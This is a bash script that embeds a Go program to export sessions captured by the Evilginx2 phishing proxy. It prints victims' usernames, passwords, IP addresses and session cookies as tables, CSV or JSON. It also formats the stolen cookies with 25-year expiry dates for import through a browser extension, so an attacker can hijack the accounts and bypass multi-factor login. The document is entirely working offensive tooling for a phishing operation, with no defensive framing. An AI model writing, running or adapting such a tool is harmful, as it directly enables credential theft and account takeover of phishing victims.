#!/bin/bash

# Export EvilGinx2 sessions utility - exact format match
# Usage: ./export_sessions.sh [session_id] [format]

SESSION_ID="$1"
FORMAT="${2:-text}"
DB_PATH="/root/evilginx2-data/data.db"

if [[ ! -f "$DB_PATH" ]]; then
    echo "Database not found: $DB_PATH"
    exit 1
fi

# Create temporary Go program that matches evilginx2 output exactly
cat > /tmp/export_sessions.go << 'GOEOF'
package main

import (
    "encoding/json"
    "fmt"
    "os"
    "strconv"
    "time"
    "strings"
    "github.com/tidwall/buntdb"
)

type Session struct {
    Id           int                                `json:"id"`
    Phishlet     string                             `json:"phishlet"`
    LandingURL   string                             `json:"landing_url"`
    Username     string                             `json:"username"`
    Password     string                             `json:"password"`
    Custom       map[string]string                  `json:"custom"`
    BodyTokens   map[string]string                  `json:"body_tokens"`
    HttpTokens   map[string]string                  `json:"http_tokens"`
    CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
    SessionId    string                             `json:"session_id"`
    UserAgent    string                             `json:"useragent"`
    RemoteAddr   string                             `json:"remote_addr"`
    CreateTime   int64                              `json:"create_time"`
    UpdateTime   int64                              `json:"update_time"`
}

type CookieToken struct {
    Name     string `json:"Name"`      // Capital N to match evilginx2 format
    Value    string `json:"Value"`     // Capital V to match evilginx2 format
    Path     string `json:"Path"`      // Capital P to match evilginx2 format
    HttpOnly bool   `json:"HttpOnly"`  // Capital H to match evilginx2 format
}

type StorageAceCookie struct {
    Path           string `json:"path"`
    Domain         string `json:"domain"`
    ExpirationDate int64  `json:"expirationDate"`
    Value          string `json:"value"`
    Name           string `json:"name"`
    HttpOnly       bool   `json:"httpOnly"`
    HostOnly       bool   `json:"hostOnly"`
    Secure         bool   `json:"secure"`
    Session        bool   `json:"session"`
}

func formatCookiesForStorageAce(session Session) []StorageAceCookie {
    var cookieArray []StorageAceCookie
    
    // Calculate expiration date (25 years from now, like evilginx2)
    expirationDate := time.Now().Unix() + (25 * 365 * 24 * 3600)
    
    for domain, cookies := range session.CookieTokens {
        for _, cookie := range cookies {
            storageAceCookie := StorageAceCookie{
                Path:           "/",  // Default path like in evilginx2
                Domain:         domain,
                ExpirationDate: expirationDate,
                Value:          cookie.Value,  // Use capital V from evilginx2
                Name:           cookie.Name,   // Use capital N from evilginx2
                HttpOnly:       cookie.HttpOnly, // Use capital H from evilginx2
                HostOnly:       true,
                Secure:         false,
                Session:        false,
            }
            cookieArray = append(cookieArray, storageAceCookie)
        }
    }
    
    return cookieArray
}

func printSessionEvilginx2Style(session Session) {
    // Print session details exactly like evilginx2
    fmt.Printf("\n id           : %d\n", session.Id)
    fmt.Printf(" phishlet     : %s\n", session.Phishlet)
    fmt.Printf(" username     : %s\n", session.Username)
    fmt.Printf(" password     : %s\n", session.Password)
    fmt.Printf(" tokens       : ")
    if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
        fmt.Printf("captured\n")
    } else {
        fmt.Printf("none\n")
    }
    fmt.Printf(" landing url  : %s\n", session.LandingURL)
    fmt.Printf(" user-agent   : %s\n", session.UserAgent)
    fmt.Printf(" remote ip    : %s\n", session.RemoteAddr)
    fmt.Printf(" create time  : %s\n", time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04"))
    fmt.Printf(" update time  : %s\n", time.Unix(session.UpdateTime, 0).Format("2006-01-02 15:04"))
    
    // Print cookies in exact evilginx2 format if they exist
    if len(session.CookieTokens) > 0 {
        fmt.Printf("\n[ cookies ]\n")
        cookieArray := formatCookiesForStorageAce(session)
        
        // Print cookies in exact JSON format like evilginx2
        cookieJSON, _ := json.Marshal(cookieArray)
        fmt.Printf("%s\n", string(cookieJSON))
        
        // Add the StorageAce extension note like in evilginx2
        fmt.Printf("\n(use StorageAce extension to import the cookies: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo)\n")
    }
    fmt.Printf("\n")
}

func printCookiesOnly(session Session) {
    if len(session.CookieTokens) > 0 {
        cookieArray := formatCookiesForStorageAce(session)
        cookieJSON, _ := json.Marshal(cookieArray)
        fmt.Printf("%s\n", string(cookieJSON))
    } else {
        fmt.Printf("No cookies found for session %d\n", session.Id)
    }
}

func printAllSessionsTable(sessions []Session) {
    if len(sessions) == 0 {
        fmt.Printf("No saved sessions found\n")
        return
    }
    
    // Print table header exactly like evilginx2
    fmt.Printf("\n+-----+-----------------+---------------+-----------------+-----------+----------------+-------------------+\n")
    fmt.Printf("| id  |    phishlet     |   username    |    password     |  tokens   |   remote ip    |       time        |\n")
    fmt.Printf("+-----+-----------------+---------------+-----------------+-----------+----------------+-------------------+\n")
    
    for _, session := range sessions {
        // Truncate long values to fit in table
        username := session.Username
        if len(username) > 13 {
            username = username[:10] + "..."
        }
        
        password := session.Password
        if len(password) > 15 {
            password = password[:12] + "..."
        }
        
        phishlet := session.Phishlet
        if len(phishlet) > 15 {
            phishlet = phishlet[:12] + "..."
        }
        
        remoteIP := session.RemoteAddr
        if len(remoteIP) > 14 {
            remoteIP = remoteIP[:11] + "..."
        }
        
        tokens := "none"
        if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
            tokens = "captured"
        }
        
        timeStr := time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04")
        
        fmt.Printf("| %-3d | %-15s | %-13s | %-15s | %-9s | %-14s | %-17s |\n",
            session.Id, phishlet, username, password, tokens, remoteIP, timeStr)
    }
    
    fmt.Printf("+-----+-----------------+---------------+-----------------+-----------+----------------+-------------------+\n")
    fmt.Printf("\n")
}

func main() {
    if len(os.Args) < 4 {
        fmt.Printf("Usage: %s <database_path> <session_id> <format>\n", os.Args[0])
        os.Exit(1)
    }
    
    dbPath := os.Args[1]
    sessionIdStr := os.Args[2]
    format := os.Args[3]
    
    var targetSessionId int
    var err error
    
    if sessionIdStr != "all" {
        targetSessionId, err = strconv.Atoi(sessionIdStr)
        if err != nil {
            fmt.Printf("Invalid session ID: %s\n", sessionIdStr)
            os.Exit(1)
        }
    }
    
    db, err := buntdb.Open(dbPath)
    if err != nil {
        fmt.Printf("Error opening database: %v\n", err)
        os.Exit(1)
    }
    defer db.Close()
    
    var sessions []Session
    
    err = db.View(func(tx *buntdb.Tx) error {
        return tx.Ascend("", func(key, value string) bool {
            if strings.HasPrefix(key, "sessions:") && key != "sessions:0:id" {
                var session Session
                if err := json.Unmarshal([]byte(value), &session); err == nil {
                    if sessionIdStr == "all" || session.Id == targetSessionId {
                        sessions = append(sessions, session)
                    }
                }
            }
            return true
        })
    })
    
    if err != nil {
        fmt.Printf("Error reading database: %v\n", err)
        os.Exit(1)
    }
    
    if len(sessions) == 0 {
        if sessionIdStr == "all" {
            fmt.Printf("No saved sessions found\n")
        } else {
            fmt.Printf("Session ID %s not found\n", sessionIdStr)
        }
        os.Exit(1)
    }
    
    switch format {
    case "json":
        for i, session := range sessions {
            sessionJSON, _ := json.MarshalIndent(session, "", "  ")
            fmt.Printf("%s", string(sessionJSON))
            if i < len(sessions)-1 {
                fmt.Printf("\n---\n")
            }
        }
        fmt.Printf("\n")
    case "csv":
        fmt.Printf("id,phishlet,username,password,landing_url,user_agent,remote_ip,create_time,update_time\n")
        for _, session := range sessions {
            fmt.Printf("%d,\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",%d,%d\n",
                session.Id, session.Phishlet, session.Username, session.Password,
                session.LandingURL, session.UserAgent, session.RemoteAddr,
                session.CreateTime, session.UpdateTime)
        }
    case "table":
        printAllSessionsTable(sessions)
    case "cookies":
        for _, session := range sessions {
            fmt.Printf("=== Session %d Cookies ===\n", session.Id)
            printCookiesOnly(session)
            fmt.Printf("\n")
        }
    default: // text format (evilginx2 style)
        if sessionIdStr == "all" {
            // Show table first, then detailed view for sessions with tokens
            printAllSessionsTable(sessions)
            
            // Show detailed view for sessions that have captured tokens
            for _, session := range sessions {
                if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
                    printSessionEvilginx2Style(session)
                }
            }
        } else {
            // Show detailed view for specific session
            for _, session := range sessions {
                printSessionEvilginx2Style(session)
            }
        }
    }
}
GOEOF

# Run the Go program
cd /root/evilginx2 && go run /tmp/export_sessions.go "$DB_PATH" "${SESSION_ID:-all}" "$FORMAT"
